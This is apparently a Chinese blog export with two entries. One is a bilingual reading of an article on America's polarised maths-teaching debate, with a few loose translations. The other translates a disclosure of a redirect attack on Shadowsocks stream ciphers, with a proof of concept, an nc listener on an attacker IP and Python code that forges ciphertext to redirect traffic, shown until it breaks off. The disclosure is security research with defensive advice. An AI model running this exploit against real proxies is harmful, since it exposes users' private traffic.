<p>美国人数学不好。</p>
<p>Its pupils have ranked poorly in international maths exams for decades.</p>
<p>几十年来，美国学生在国际数学考试中排名很差。</p>
<p>In 2018, American 15-year-olds ranked 25th in the oecd, a club of mostly rich countries.</p>
<p>2018年，美国15岁青少年的数学成绩在经济合作与发展组织（Organization for Economic Cooperation and Development, OECD）中排第25名，该组织成员包含了大部分富裕国家。</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/07/OECD.png" alt="OECD.png"></p>
<p>American adults ranked fourth-from-last in numeracy when compared with other rich countries.</p>
<p>和其他富裕国家相比，美国成人的算术排倒数第四。</p>
<p>As many as 30% of American adults are comfortable only with simple maths: basic arithmetic, counting, sorting and similar tasks.</p>
<p>30%的美国成人只会简单的数学：基本四则运算、计数、排序和简单的数学题。</p>
<p>American employers are desperate for science, technology, engineering and mathematics skills: nuclear engineers, software developers and machinists are in short supply.</p>
<p>美国的雇主对科学、技术、工程和数学技能的紧缺感到绝望：他们很缺核工程师、软件开发者和机械师。</p>
<p>And while pupils’ maths scores are bad enough now, they could be getting worse.</p>
<p>现在学生的数学成绩已经够差了，还可能变得更差。</p>
<p>On the National Assessment of Educational Progress (naep), a national exam, 13-year-old pupils’ scores dropped five points in 2020 compared with their peers’ in 2012.</p>
<p>2020年，国家成绩报告单（National Assessment of Educational Progress, naep）显示，与2012年的同龄学生相比，13岁学生的分数下降了5分。</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/07/girl.jpg" alt="girl.jpg"></p>
<p>The status quo does not add up.</p>
<p>现状未做统计。</p>
<p>（备注：status quo是拉丁文）</p>
<p>But teachers and academics cannot agree on where to go next.</p>
<p>但是老师和学者没有就接下来的举措达成一致。</p>
<ol start="2">
<li>History of “New Math curriculum” “新数”的历史</li>
</ol>
<p>The American maths problem is over a century old, says Alan Schoenfeld of the University of California, Berkeley.</p>
<p>加州伯克利大学的Alan Schoenfeld讲道，美国人的数学问题早就是世纪难题了。</p>
<p>In 1890 high school was an elite endeavour: less than 7% of 14-year-olds were enrolled and they were educated in rigorous maths.</p>
<p>1890年，高中是一场精英的奋斗：能上高中的14岁青少年不足7%，他们学的是严谨数学。</p>
<p>By the beginning of the second world war, by which time army recruits had to be trained in the maths needed for basic bookkeeping and gunnery, nearly three-quarters of children aged 14-17 attended high school.</p>
<p>在二战开始以前，新兵必须参加数学训练，用于基本簿记和射击。14至17岁的青少年中，将近四分之三都上过高中。</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/07/library-of-congress-3ujfoSnBcI4-unsplash.jpg" alt="library-of-congress-3ujfoSnBcI4-unsplash.jpg"></p>
<p>The cold war sparked a second strategic maths panic in the 1950s.</p>
<p>20世纪50年代，冷战引发了第二次战略数学的恐慌。</p>
<p>A new maths curriculum, focused on conceptual understanding rather than rote memorising, was developed after the launch of the Sputnik satellite by the Soviet Union.</p>
<p>苏联发射1号卫星之后，美国开发了“新数”课程。“新数”更注重概念的理解，而非死记硬背。</p>
<p>Then that new curriculum was rejected in a move back to basics in the 1970s.</p>
<p>20世纪70年代，在“回到基础”运动中，“新数”被取消了。</p>
<ol start="3">
<li>Commission produced a report called “A Nation at Risk” 委员会发布报告—“处于危险中的国家”</li>
</ol>
<p>Maths teaching became a worry again when America started to fear being overtaken by Japan.</p>
<p>当美国开始担心被日本超越时，数学教育再次成为焦虑。</p>
<p>In 1981 the secretary of education appointed a commission to evaluate the curriculum.</p>
<p>1981年，教育部长任命了“新数”评估委员会。</p>
<p>It produced a report called “A Nation at Risk”.</p>
<p>委员会发布了一篇名为“处于危险中的国家”的报告。</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/07/A_Nation_at_Risk.jpg" alt="A_Nation_at_Risk.jpg"></p>
<p>“If an unfriendly foreign power had attempted to impose on America the mediocre educational performance that exists today,” the report reported, “we might well have viewed it as an act of war.”</p>
<p>“如果不友好的外国势力试图“欺负”我们如今平庸的教育业绩，”报告写道，“我们也许应该视之为一场“战争”。</p>
<p>4.Conservatives: classical maths<br>4. 保守主义者：古典数学</p>
<p>Since the 1990s, though, maths has become more political.</p>
<p>自20世纪90年代以来，数学变得更加政治化了。</p>
<p>Conservatives typically campaign for classical maths: a focus on algorithms (a set of rules to be followed), memorising (of times tables and algorithmic processes) and teacher-led instruction.</p>
<p>保守主义者通常为古典数学发起运动：重视运算法则（一套需要遵守的规则）、死记硬背（乘法表和算法过程）和教师主导的教学。</p>
<p>Pupils in these classrooms focus on the basics, exploring concepts after obtaining traditional skills, explains Bill Evers of the Independent Institute, a think-tank in Oakland.</p>
<p>奥克兰独立机构（智库）的Bill Evers解释道，“教室里的这些学生把重心放在了基础，在掌握了传统技能之后，才开始学习概念。”</p>
<p>These methods are familiar to many.</p>
<p>这些方法并不陌生。</p>
<p>For two-digit addition, pupils would be taught a paper-and-pencil method.</p>
<p>对于两位数的加法，可能会教学生使用纸笔演算法。</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/07/chris-liverani-ViEBSoZH6M4-unsplash.jpg" alt="chris-liverani-ViEBSoZH6M4-unsplash.jpg"></p>
<p>Add 27 + 45 by stacking 27 over 45.</p>
<p>“27+45”就是把27写到45上面。</p>
<p>Add up the right column (7 + 5 = 12).</p>
<p>先把右列相加（7+5=12）。</p>
<p>Write down the 2, and carry the 1 to the left column.</p>
<p>结果写2，把1放到左列。</p>
<p>Add up the left column (1 + 2 + 4 = 7).</p>
<p>再计算左列（1+2+4=7）。</p>
<p>Write down the 7.</p>
<p>结果写7。</p>
<p>The answer is 72.</p>
<p>得出答案是72。</p>
<ol start="5">
<li>Progressives: conceptual maths 进步主义者：概念数学</li>
</ol>
<p>Progressives typically favour a conceptual approach to maths based on problem-solving and gaining number-sense, with less emphasis on algorithms and memorising.</p>
<p>进步主义者通常更喜欢理解数学概念，基于解决问题和掌握数字感，而不那么强调运算法则和死记硬背。</p>
<p>In contrast to the conservative strategy, pupils would learn several ways to solve a problem, by using objects and by other means, before learning algorithms.</p>
<p>和保守主义者的方法相比，学生会学习解决一个问题的几种方法，在学习运算法则之前先用实例或其他方式学习。</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/07/christiann-koepke-szqxBF4OUsc-unsplash.jpg" alt="christiann-koepke-szqxBF4OUsc-unsplash.jpg"></p>
<p>To solve 27 + 45, pupils could add up the digits in the ones place (7+5=12), and then the tens place (20+40=60), and then add them together to get 72.</p>
<p>计算“27+45”，学生可以计算先个位之和（7+5=12），再计算十位之和（20+40=60），最后再把这两个结果相加得出72。</p>
<p>Or they could realise that 27 is 3 digits away from 30.</p>
<p>或许他们会发现27和30只相差3。</p>
<p>They would add 3 to get to 30.</p>
<p>先加上3得到30。</p>
<p>Then add 45 and subtract 3 to get 72.</p>
<p>然后加上45，减去3，就得出了72。</p>
<p>Conceptual maths strategies encourage pupils to find many potential solutions for the same problem to gain number-sense, rather than relying on an algorithm.</p>
<p>为了培养学生的数字感，概念数学教学法鼓励学生寻找更多可能的方法去解决同一个问题，而非依赖唯一的运算法则。</p>
<ol start="6">
<li>How to improve it? 如何提升数学？</li>
</ol>
<p>Although most teachers agree that maths education in America is sub-par, they have not been able to agree on how to improve it.</p>
<p>尽管大部分老师认为美国的数学教育欠佳，他们还是无法达成一致的提升方法。</p>
<p>Copying methods used in highly ranked mathematical nations such as Singapore would be one way.</p>
<p>解决方案之一是向数学教育排名靠前的国家（如：新加披）学习，把教学方法照搬过来。</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/07/Singapore-math.png" alt="Singapore-math.png"></p>
<p>But that would require agreement on what is actually being taught in other countries.</p>
<p>但这样做的前提是，关于其他国家到底是怎么教学的，大家得达成共识。</p>
<p>According to Mr Evers, successful Asian curriculums reflect the classical position.</p>
<p>Evers先生认为，亚洲数学课程的成功反映了古典数学的地位。</p>
<p>“What country do you think has totally adopted progressive education and has been a big success?</p>
<p>“你觉得哪个国家完全采取进步主义教育并且取得了巨大成功？</p>
<p>China is very teacher-led.</p>
<p>中国是教师主导教学的典型。</p>
<p>Singapore math is the best in the world.</p>
<p>新加披是世界上数学最好的国家。</p>
<p>It’s not progressive,” explains Mr Evers.</p>
<p>它并不是进步主义教育。”Evers先生解释道。</p>
<p>But Mr Schoenfeld reckons countries such as Japan and Singapore implement conceptual curriculums.</p>
<p>但是Schoenfeld先生认为，像日本和新加披这样的国家施行的是概念课程。</p>
<ol start="7">
<li>The Common Core “共同核心”课程</li>
</ol>
<p>Part of the confusion stems from the messy implementation of the most recent maths curriculum, the Common Core.</p>
<p>让人感到迷糊的部分原因是，最近“共同核心”课程的施行得一团乱。</p>
<p>Implemented in 2010 under President Barack Obama’s administration, 41 states and the District of Columbia adopted the principles.</p>
<p>“共同核心”课程始于2010年奥巴马执政时期，41个州和哥伦比亚区都采纳了这套标准。</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/07/Common-core-2.png" alt="Common-core-2.png"></p>
<p>Texas, Florida and several others opted out.</p>
<p>只有德州、弗罗里达和少数几个州弃用“共同核心”课程。</p>
<p>Despite initially being a bipartisan effort (Jeb Bush and other conservatives supported the Obama administration’s effort), it was eventually criticised by both sides.Some view it as an example of progressive education, while others think it was not progressive enough.</p>
<p>尽管最初是两党一起努力推行（Jeb Bush和其他保守主义者都支持奥巴马政府所作的努力），最终“共同核心”课程却受到了两党的批评。一些人将它视作进步主义教育的典范，而另一些人认为这还不够进步主义。</p>
<p>Now that test results are rolling in, many conservatives claim that the falling scores show the failure of the Common Core and progressive teachers.</p>
<p>如今测试结果纷纷出炉，很多保守主义者声称，分数的下降说明了“共同核心”课程和进步主义教师的失败。</p>
<p>But supporters of the current curriculum are not prepared to give up.</p>
<p>但是“共同核心”课程的支持者并不打算放弃。</p>
<p>Whereas naep scores declined among 13-year-olds, they stayed steady among nine-year-olds, who would have studied Common Core for their whole school lives.</p>
<p>不管13岁学生的国家成绩报告单（即naep）分数如何下降，9岁学生的分数始终稳定不降，而他们在学校一直都学习“共同核心”课程。</p>
<ol start="8">
<li>Paired conceptual maths with racist 对比概念数学和种族主义</li>
</ol>
<p>Further muddling the mess, far-left activists have paired conceptual maths methods with more radical concepts.</p>
<p>让局面更混沌的是，极左激进分子将概念数学法和种族主义相提并论。</p>
<p>Many opponents of conceptual maths believe that Common Core, and conceptual maths in general, bans teaching of rote-learning, as in multiplication tables.</p>
<p>概念数学的许多反对者认为，“共同核心”课程和概念数学通常禁止死记硬背的教学方式，比如乘法表。</p>
<p>A prominent maths-education scholar at Stanford University, Jo Boaler, claims that memorising times tables is unnecessary.</p>
<p>斯坦福大学著名数学教育学者Jo Boaler声称，没有必要去背乘法表。</p>
<p>Conservatives have seized on this idea as an example of liberal activism gone wild.</p>
<p>保守主义者抓住这点，并以此例证自由派激进分子已经变疯狂。</p>
<p>But Mr Schoenfeld claims this does not align with progressive maths values.</p>
<p>但Schoenfeld先生声称这不符合进步主义数学观。</p>
<ol start="9">
<li>Paired conceptual maths with “social-justice maths” 对比概念数学和“社会正义数学”</li>
</ol>
<p>Some activists have also paired conceptual maths with “social-justice maths”, the concept that maths should be used to help pupils solve real-world issues and appraise the world around them.</p>
<p>一些进步主义者还把概念数学和“社会正义数学”相提并论。“社会正义数学”是指数学应该用来帮助学生解决实际问题并鉴定周围的世界。</p>
<p>Dubbed “woke math[s]” and tagged with headlines such as “In California 2+2=4 May Be Thought Racist” (as a letter to the Wall Street Journal harrumphed), it has done conceptual maths few favours by association.</p>
<p>被称为“觉醒数学”，并标有诸如“在加州，2+2=4可能被视作种族主义” （一封寄给华尔街日报的信中这样埋怨）之类的标题，这导致概念数学几乎没有得到任何机构的支持。</p>
<ol start="10">
<li>Conclusion: polarised 总结：极端</li>
</ol>
<p>The maths debate in America is polarised and confused.</p>
<p>美国的数学之争非常极端混乱。</p>
<p>While other countries implement maths curriculums with a balance of rote and conceptual learning, America continues to swing from one pole to another, decade after decade.</p>
<p>其他国家施行的数学课程平衡了死记硬背和概念学习，而美国继续年复一年地从一个极端走向另一个极端。</p>
<p>Just like the country’s politics, in other words.</p>
<p>也就是说，像该国的政治一样摇摆不定。</p>
<p>孔子有句话叫“因材施教”，要想统一教育方法，基本上很难达成共识。最后的方案只能是少数服从多数。</p>
<p>本文有点长，感谢读完：）</p>
]]></content>
      <categories>
        <category>经济学人</category>
      </categories>
      <tags>
        <tag>I期马拉松</tag>
        <tag>经济学人</tag>
        <tag>浓咖啡</tag>
      </tags>
  </entry>
  <entry>
    <title>重定向攻击shadowsocks流加密</title>
    <url>//posts/ZH-CN/Shadow_Love_Why.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是<a href="http://wiki.ioin.in/">Sec-News</a>今天发布的消息，就是shadowsocks存在重定向攻击漏洞。这篇文档是英文的，试着翻译一下。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><blockquote>
<p><strong>Redirect attack on Shadowsocks stream ciphers</strong></p>
</blockquote>
<p><strong>shadowsocks流加密存在重定向攻击漏洞</strong></p>
<blockquote>
<p>Shadowsocks is a secure split proxy loosely based on SOCKS5. It’s widely used in china. However, we found a vulnerability in shadowsocks protocol which break the confdentiality of shadowsocks stream cipher. An attacker can easliy decrypt all the encrypted shadowsocks packet using our redirect attack. As the vulnerability is obvious and easy to exploit. I think the government has already know it. So, using shadowsocks in steam cipher cannot hide yourself from surveillance. </p>
</blockquote>
<p>Shadowsocks是大致基于SOCKS5的一种安全分割代理，在中国得到广泛使用。然而，我们发现了shadowsocks协议的一个漏洞，它会破坏shadowsocks流加密的保密性。攻击者可以轻松地使用重定向攻击解密所以已加密的shadowsoocks包。这个漏洞很明显，容易利用。我认为政府早就知道了。所以，使用shadowsocks流加密并不能逃脱监视。</p>
<blockquote>
<p>How shadowsocks works:<br>The Shadowsocks local component (ss-local) acts like a traditional SOCKS5 server and provides proxy service to clients. It encrypts and forwards data streams and packets from the client to the Shadowsocks remote component (ss-remote), which decrypts and forwards to the target. Replies from target are similarly encrypted and relayed by ss-remote back to sslocal, which decrypts and eventually returns to the original client.  client &lt;—&gt; ss-local &lt;–[encrypted]–&gt; ss-remote &lt;—&gt; target </p>
</blockquote>
<p>shadowsocks的工作原理:<br>shadowsocks本地终端（ss-local）像传统的SOCKS5服务器一样，为客户端提供代理服务。它对客户端传输的数据流和数据包进行加密，并发送至shadowsocks远程终端（ss-remote）。由ss-remote解密这些加密的数据，将数据发送到目标服务器。类似地，目标服务器的响应数据被ss-remote加密，并中转到ss-local，最终由ss-local解密并将响应数据返回到原始客户端。<br>流程是这样：client &lt;—&gt; ss-local &lt;–[encrypted]–&gt; ss-remote &lt;—&gt; target</p>
<blockquote>
<p>Official implementations of shadowsocks:<br>shadowsocks: The original Python implementation.<br>shadowsocks-libev: Lightweight C implementation for embedded devices and low end boxes. Very small footprint (several megabytes) for thousands of connections.<br>shadowsocks-go: Go implementation with multi-port, multi-password, user management and trafc statistics support for commercial deployments.<br>o-shadowsocks2: Another Go implementation focusing on core features and code reusability.<br>Shadowsocks-nodejs: Another shadowsocks implementation for nodejs. Although it’s deprecated, there still many people using it through npm. </p>
</blockquote>
<p>shadowsocks的官方实现方式：<br>shadowsocks：由原始的python实现。<br>shadowsocks-libev: 由轻量级C语言实现，用于嵌入式设备和低端盒子。几兆的小脚本就支撑成千上万的连接数。<br>shadowsocks-go: 由Go语言实现，有多个端口，多个密码，为商业应用提供用户管理和数据分析的支撑。<br>o-shadowsocks2: 这也是由Go语言实现，专注于内核特色和代码的复用性。<br>Shadowsocks-nodejs: 由nodejs实现的shadowsocks。虽然不推荐使用，但是依然有很多人通过npm使用它。</p>
<blockquote>
<p>Ciphers of shadowsocks:<br>Shadowsocks support the two kinds of ciphers:<br>Steam ciphers (none-AEAD cipher): Rc4-md5, salsa20,chacha20,chacha-ietf, aes-ctf, bf-cfb, camellia-cfb, aes-cfb<br>AEAD ciphers: aes-gcm,chacha-ietf-poly1305,xchacha20-ietf-poly1305<br>Normally, Stream ciphers provide only confdentiality, Data integrity and authenticity is not guaranteed. Users should use AEAD ciphers whenever possible. We audit all the official implementations of shadowsocks listed above. What surprised us was that only shadowsockslibev support AEAD cipher. All other official implementation only support steam cipher. This means that the data integrity and authenticity of most SS users is not guaranteed from a Mitm attacker.<br>More seriously, we found a vulnerability in shadowsocks protocol which break the confdentiality of shadowsocks stream cipher. An attacker can decrypt all the encrypted shadowsocks packet using our redirect attack. </p>
</blockquote>
<p>shadoesocks加密：<br>Shadowsocks支持两种加密方式：<br>流加密（非AEAD加密）：Rc4-md5, salsa20,chacha20,chacha-ietf, aes-ctf, bf-cfb, camellia-cfb, aes-cfb<br>AEAD加密：aes-gcm,chacha-ietf-poly1305,xchacha20-ietf-poly1305<br>通常，流加密只提供保密性，不能确保数据完整性和真实性。用户应该尽可能使用AEAD加密方式。我们审计了以上列出来的shadowsocks的官方实现方式，令人惊讶的是，只有shadowsockslibev支持AEAD加密，其他的官方实现方式都仅仅支持流加密。这意味着大多数SS用户的数据完整性和真实性难保不被中间人攻击。<br>更严肃的是，我们发现了shadowsocks协议的一个漏洞，它会破坏shadowsocks流加密的保密性。攻击者可以轻松地使用重定向攻击解密所以已加密的shadowsoocks包。</p>
<blockquote>
<p>Redirect attack on Shadowsocks stream cipher:<br>Here we first invest how shadowsocks initiates a connection.<br>Initiating a TCP connection:<br>ss-local initiates a TCP connection to ss-remote by sending an encrypted data stream starting with the target address followed by payload data. The exact encryption scheme diﬀers depending on the cipher used.<br>[target address][payload]<br>ss-remote receives the encrypted data stream, decrypts and parses the leading target address. It then establishes a new TCP connection to the target and forwards payload data to it. ss-remote receives reply from the target, encrypts and forwards it back to the ss-local, until ss-local disconnects. By the way, the UDP packet of shadowsocks has the same struct. </p>
</blockquote>
<p>重定向攻击shadowsocks流加密：<br>我们先给shadowsocks初始化一个连接。<br>初始化一个TCP连接：<br>ss-local发送加密的数据流到ss-remote，初始化一个ss-local到ss-remote的TCP连接，目标地址后面加上payload数据。具体的加密协议因使用的加密方式而异。<br>[目标地址][payload数据]<br>ss-remote接收到加密的数据流，解密并解析出目标地址，然后建立一个ss-remote到目标服务器的TCP连接，将payload数据发送至目标服务器。ss-remote收到目标服务器的响应，解密响应数据，把它返回给ss-local，直到ss-local断开连接。顺便说一下，shadowsocks的UDP包也是一样的结构。</p>
<blockquote>
<p>Address format:<br>Addresses used in Shadowsocks follow the SOCKS5 address format:<br>[1-byte type][variable-length host][2-byte port]<br>The following address types are defned:<br>0x01: host is a 4-byte IPv4 address.<br>0x03: host is a variable length string, starting with a 1-byte length, followed by up to 255-byte domain name.<br>0x04: host is a 16-byte IPv6 address<br>The port number is a 2-byte big-endian unsigned integer. Essentially, ss-remote is performing Network Address Translation for ss-local. </p>
</blockquote>
<p>地址格式：<br>shdowsocks使用的地址遵照SOCKS5的地址格式：<br>[单字节的类型][可变长度的host][2字节的端口号]<br>下面的地址类型是预定义的:<br>0x01: host是4字节的IPv4地址。<br>0x03: host是可变长度的字符串，域名的长度范围从1字节到255字节。<br>0x04: host是16字节的IPv6地址。<br>端口号是2字节大端无符号整型数据。实质上，ss-remote为ss-local做网络地址转换。</p>
<blockquote>
<p>Stream Encryption/Decryption:<br>Stream_encrypt is a function that takes a secret key, an initialization vector, a message, and produces a ciphertext with the same length as the message.<br>Stream_encrypt(key, IV, message) =&gt; ciphertext<br>Stream_decrypt is a function that takes a secret key, an initializaiton vector, a ciphertext, and produces the original message.   Stream_decrypt(key, IV, ciphertext) =&gt; message<br>The key can be input directly from user or generated from a password. The key derivation is following EVP_BytesToKey(3) in OpenSSL. The detailed spec can be found here.<br>[IV][encrypted payload]<br>Cleverly, attacker can brute force your password and then decrypt your packet. Which means there is no forward security for shadowsocks. You can easily protect yourself from the brute force attack by using a strong password. </p>
</blockquote>
<p>流加密/流解密：<br>流加密函数通过使用一个密钥，一个初始向量，一个消息体，生成一个和消息体等长的加密文本。<br>Stream_encrypt(key, IV, message) =&gt; ciphertext<br>流解密函数通过使用一个密钥，一个初始向量，一个加密文本，生成原始消息体。<br>Stream_decrypt(key, IV, ciphertext) =&gt; message<br>密钥可以直接由用户输入，或者由密码生成。密钥推导遵循OpenSSL的EVP_BytesToKey(3)，详细规范可以在这里找到。<br>[IV][encrypted payload]<br>聪明的攻击者很轻易就能暴力破解你的密码，解密数据包。这意味着shadowsocks没有前向安全性。你可以设置强密码，这样能轻易避免遭受暴力破解攻击。</p>
<blockquote>
<p>Redirect attack on Shadowsocks<br>Is there anyway we can decrypt shadowsocks without brute force the password? Yes, there is. As we mentioned, stream cipher in shadowsocks does not provide data integrity. So we can create a new ciphertext by modifying the existed one. If we know the plaintext of some particular ciphertext, we can even completely control the content of the plaintext.  In particular, if we make new ciphertext encrypting the following content:<br>[target address] [payload]<br>And the target IP address is controlled by you. We can prevent to be a valid ss-local to create a redirect tunnel like this:<br>ss-local(fake one) &lt;–[encrypted]–&gt; ss-remote &lt;—&gt; target(controlled)<br>Any encrypted packet we send in the [encrypted] tunnel, the ss-remote will decrypt it and redirect the plaintext to the target IP address your control. Then we can decrypt every encrypted shadowsocks packet by using this tunnel. </p>
</blockquote>
<p>重定向攻击shadowsocks<br>有没有什么方法可以不用暴力破解就能解密shadowsocks？答案是有的。正如我们提到过，流加密不提供数据完整性，所以我们可以修改已有的加密文本来新建一个加密文本。如果我们知道某个特殊加密文本的纯文本，我们甚至可以完全控制这个纯文本的内容。尤其是，如果我们新建的加密文本加密了以下内容：<br>[target address] [payload]<br>这个IP地址就被你控制了。我们可以做一个非法的ss-local，去创建这样的重定向通道：<br>ss-local(fake one) &lt;–[encrypted]–&gt; ss-remote &lt;—&gt; target(controlled)<br>我们在加密通道发出的所有加密数据包，ss-remote都会解密之，并且把纯文本重定向到你已经控制的目标服务器。我们就可以通过这个通道解密所有已加密的shadowsocks数据包。</p>
<blockquote>
<p>Demo: AES-256-CFB<br>Here we take AES-256-CFB as an example, to show the power of redirect attack on shadowsocks stream cipher. Give any ciphertext [IV][encrypted payload]. The AES-CFB decryption work like this:<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8f7y129j30mx08cdh2.jpg" alt="image.png"><br>As we can see, if we modify the first block of ciphertext from c1 to c1’. We can change the first block of plaintext from p1 to p1’. The relation is the following:<br>c1’=Xor(c1,r)<br>p1’=Xor(p1,r)<br>To construct a valid [target address]=[0x01,IP（4bytes）,Port(2bytes)] , we only need to control the first 7 byte the p1’. If we know the first 7bytes of p1, we can create redirect tunnel to decrypt every encrypted packet.<br>So the problem becomes: How can we get ciphertext [IV][encrypted payload] with known first 7 bytes. It’s easy, we can get it in many ways. In this example, we use the common pattern in HTTP protocol. As we see in the following tcp flow:<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8m6cga8j30jh0d3dmr.jpg" alt="image.png"><br>We user access some web site. The Http server always reply with a prefix ‘HTTP/1.’. We can collect all the TCP follow, and suppose that it is http connection. Then we can try to modify the first packet (“”) of it to get a desired c1’ with [malicious address] [payload] in p1’. Although we don’t know which one is correct. But we can try many times, once there is a correct HTTP connection, we immediately construct a redirect tunnel. Then we can use this tunnel to decrypt every encrypted packet.<br>Here is the POC for AES-256-CFB in shadowsocks:<br>ss-server runing on : 192.168.1.2:8899<br>ss-client running on: 192.168.1.4<br>attacker IP: 192.168.1.3<br>Attacker capture a http connection, and listen on 192.168.1.3:4626 with:<br>nc -l -p 4626 &gt;1.txt<br>Then attacker use the following code to create a redirect tunnel:<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8yeqwzzj30lm0b0gov.jpg" alt="image.png"><br>Then we can see the decrypted packet:<br>How to defense you self from redirect attack:<br>Do not use : shadowsocks-py, shadowsocoks-go, go-shadowsocks2, shadowsocoks-nodejs.<br>Only Use:  shadowsocks-libev, and only use the AEAD ciphers. </p>
</blockquote>
<p>例子: AES-256-CFB<br>为了演示重定向攻击流加密，我们用AES-256-CFB来举例。给一个任意的加密文本，初始向量，加密的payload数据，AES-CFB解密的过程就像这样：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8f7y129j30mx08cdh2.jpg" alt="image.png"><br>正如我们看到的，如果我们修改从c1到c1’的加密文本的第一部分，我们就可以修改从p1到p1’的第一部分。关系如下：<br>c1’=Xor(c1,r)<br>p1’=Xor(p1,r)<br>为了构造一个有效的目标地址[target address]=[0x01,IP（4bytes）,Port(2bytes)]，我们只需要控制p1’的前7个字节。如果我们知道p1的前7个字节，就可以创建重定向通道，解密任一已加密的数据包。<br>所以问题变成了：已知了前7个字节，我们如何得到加密文本，初始向量，已加密的payload数据？很简单，有很多种方式得到。比如，我们使用HTTP协议的常用模式，如下图所示的tcp流：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8m6cga8j30jh0d3dmr.jpg" alt="image.png"><br>我们用户访问某个网站时，Http服务器总是会回复‘HTTP/1.’这样的前缀。我们可以收集所有的TCP流，我们认为就是http连接。然后我们可以试着修改第一个包，利用p1’的 [malicious address] [payload]得到一个想要的c1’。尽管我们不知道哪一个是正确的，但是我们可以多次尝试，直到建立正确的HTTP连接，立刻就会创建一个重定向通道。接下来就可以使用这个通道解密任一已加密的包。<br>这是shadowsocks AES-256-CFB的POC：<br>ss-server runing on : 192.168.1.2:8899<br>ss-client running on: 192.168.1.4<br>attacker IP: 192.168.1.3<br>攻击者捕获一个http连接，用命令<code>nc -l -p 4626 &gt;1.txt</code>监听192.168.1.3:4626，然后攻击者用以下代码创建一个重定向通道：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8yeqwzzj30lm0b0gov.jpg" alt="image.png"><br>然后我们可以看到解密的数据包：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8z7xmq5j30lk0bkdiu.jpg" alt="image.png"><br>怎样避免受到重定向攻击：<br>不使用：shadowsocks-py, shadowsocoks-go, go-shadowsocks2, shadowsocoks-nodejs。<br>只使用：shadowsocks-libev, 并且只用AEAD这种加密方式。</p>
<h2 id="创建定向通道的代码"><a href="#创建定向通道的代码" class="headerlink" title="创建定向通道的代码"></a>创建定向通道的代码</h2><p>分为http请求和https请求：</p>
<ul>
<li>http请求：attack_with_http_pocket.py<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> encrypt</span><br><span class="line"><span class="keyword">from</span> encrypt <span class="keyword">import</span> Encryptor</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">s1,s2</span>):</span></span><br><span class="line">	n=<span class="built_in">len</span>(s1)</span><br><span class="line">	r=<span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">		r+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s1[i])^<span class="built_in">ord</span>(s2[i]))</span><br><span class="line">	<span class="keyword">return</span> r</span><br><span class="line">method=<span class="string">&#x27;aes-256-cfb&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up</span>(<span class="params">c</span>):</span></span><br><span class="line">    l=<span class="number">16</span>-<span class="built_in">len</span>(c)%<span class="number">16</span></span><br><span class="line">    c=c+<span class="string">&#x27;\x00&#x27;</span>*l</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="comment">#c is a capture http packet.</span></span><br><span class="line">c=<span class="string">&#x27;57122435b0ab1e28db5e59f49f5510dc7196c0cba5e6119eb8cf293210522da840b1360e7b0727122e90bb9c474f586574742fdbc5bc6ca39d8f79afefc21db6a3dbf263d6116260dd7f763691b105091ce07e8f98e9215639099c0912defd608c8c0da1e9ce4f6127a933e60833a953c1ace7f7c6589ad0f7cf1347e2967699cfb70a9a9b6114f13454f49472793504f1487b0ff73604fe0fd82ae92b8ca082fc8ca978303da066edda40e6&#x27;</span></span><br><span class="line">c=c.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="comment">#c=up(c)</span></span><br><span class="line">prefix_http=<span class="string">&#x27;HTTP/1.&#x27;</span></span><br><span class="line">prefix_https_recv=<span class="string">&#x27;\x16\x03\x03\x00\x8d\x02\x00&#x27;</span></span><br><span class="line">prefix_https_send=<span class="string">&#x27;\x16\x03\x01\x02\x00\x01\x00&#x27;</span></span><br><span class="line"><span class="comment">#targetIP=&#x27;\x01\xc0\xa8\x01\x03\x12\x12&#x27;# malicous target IP address: 192.168.1.3:4626</span></span><br><span class="line"><span class="comment">#targetIP=&#x27;\x01\x23\xbd\xa0\x6b\x1f\x90&#x27;</span></span><br><span class="line">targetIP=<span class="string">&#x27;\x01\x2f\x34\xab\x43\x12\x12&#x27;</span></span><br><span class="line">x=xor(prefix_https_recv,targetIP)</span><br><span class="line">y=c[<span class="number">16</span>:<span class="number">16</span>+<span class="number">7</span>]</span><br><span class="line">z=xor(x,y)</span><br><span class="line">cipertext=c[<span class="number">0</span>:<span class="number">16</span>]+z+c[<span class="number">16</span>+<span class="number">7</span>:]</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">obj = socket.socket()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;begin\n&quot;</span>)</span><br><span class="line">obj.connect((<span class="string">&quot;ip&quot;</span>,<span class="number">8080</span>))<span class="comment"># ss-server is running on 192.168.1.2:8899</span></span><br><span class="line">obj.send(cipertext)<span class="comment"># send the payload to construct a redirect tunnel</span></span><br><span class="line">buf=obj.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></li>
